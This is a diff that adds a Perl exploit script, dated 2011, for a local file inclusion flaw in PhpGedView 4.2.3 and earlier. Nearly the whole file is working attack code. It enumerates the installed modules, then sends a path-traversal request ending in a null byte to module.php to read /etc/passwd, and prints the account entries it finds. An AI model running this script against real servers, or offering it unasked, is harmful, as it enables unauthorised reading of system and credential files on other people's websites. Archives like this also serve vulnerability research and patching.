@@ -1,0 +1,130 @@
+#!/usr/bin/perl -w
+ 
+#  :::::::-.   ...    ::::::.    :::.
+#   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+#   `[[     [[[['     [[[  [[[[[. '[[
+#    $$,    $$$$      $$$  $$$ "Y$c$$
+#    888_,o8P'88    .d888  888    Y88
+#    MMMMP"`   "YmmMMMM""  MMM     YM
+#  [ Discovered by dun \ posdub[at]gmail.com ]
+#
+##################################################################
+#  [ PhpGedView <= 4.2.3 ]  Local File Inclusion Vulnerability   #
+##################################################################
+#
+# Script: "PhpGedView is a revolutionary genealogy program which
+#          allows you to view and edit your genealogy on your website..."
+#
+# Script: http://www.phpgedview.net/
+# Download: http://sourceforge.net/projects/phpgedview/
+#
+# Usage: perl expl.pl http://site.com/phpgedview/
+#
+##################################################################
+#[ dun / 2011-01-05 ]
+
+use IO::Socket;
+use Socket;
+use IO::Select;
+
+
+my @modules; 
+
+if(scalar(@ARGV) < 1) {
+    print "\nUsage: perl expl.pl http://site.com/phpgedview/\n\n";
+    exit;
+}
+ 
+print "\033[32m[1] \033[0mChecking installed PGV modules..\n";
+@modules=get_modules_list($ARGV[0].'/modules/');
+print "\033[32m[2] \033[0mTrying to read /etc/passwd file..\n";
+p(\@modules, $ARGV[0].'/', '/etc/passwd');
+
+sub http_query {
+
+ my $page="";
+ my $url=$_[0];
+ my $ua="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)";
+  if(defined($_[1]) && defined($_[2])) {
+     $host=$_[1];
+     $port=$_[2];
+     $get="GET $url HTTP/1.0\r\n$ua\r\nConnection: Close\r\n\r\n";
+  } else {
+     $port=80;
+     $url=~s/http:\/\///;
+     $host=$url;
+     $query=$url;
+     $host=~s/([a-zA-Z0-9\.]+)\/.*/$1/;
+     $query=~s/$host//;
+     if ($query eq "") {$query="/";};
+
+     $get="GET $query HTTP/1.0\r\nHost: $host\r\n$ua\r\nConnection: Close\r\n\r\n";
+  }
+ my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"$port",Proto=>"tcp",Timeout => 3) or return;
+ print $sock $get;
+ my @r = <$sock>;
+ $page="@r";
+ close($sock);
+     
+ return $page;
+}
+
+sub get_modules_list {
+ my $host = $_[0];
+ my $page="";
+ my @modules1=(
+  "FCKeditor",
+  "GEDFact_assistant",
+  "JWplayer",
+  "batch_update",
+  "cms_interface",
+  "gallery2",
+  "googlemap",
+  "lightbox",
+  "punbb",
+  "research_assistant",
+  "sitemap",
+  "slideshow",
+  "wordsearch"
+ );
+
+ $page = http_query($host);
+ while($page =~ m/(.*)<(a|A)\s(href|HREF)="([^\/]+)\/">/g){
+  push (@modules2, $4);
+ }
+ if(@modules2) {
+  print " Installed modules: @modules2\n";
+  return @modules2;
+ } else {
+  print " No info about installed modules..\n";
+  return @modules1;
+ }
+}
+
+sub p {
+ my($mods, $host, $file)=@_;
+ my $page="";
+ foreach $r(@{$mods}) {
+	$q="$host"."module.php?mod=$r&pgvaction=".("/.."x10)."$file%00";
+	$page=http_query($q);
+	@lines = split (/\n/, $page);
+	if($page=~ m/(.+):.:\d+:\d+:(.*):\/(.+):\/(.*)/g){
+	 print "\033[32mModule: $r\n";
+	 print "Adress: $q\n";
+	 print "File:   /etc/passwd:\033[0m (Press ENTER) ";
+	 if(<STDIN>) {
+	 print "\n\n";
+	  for(@lines) {
+	   if($_=~ m/(.+):.:\d+:\d+:(.*):\/(.+):\/(.*)/g){
+		print $_."\n";			
+	   }
+          }
+	 }
+	return 0;
+	}
+ }
+ print "\033[31mFailed :(\033[0m\n"
+}
+
+##################################################################
+
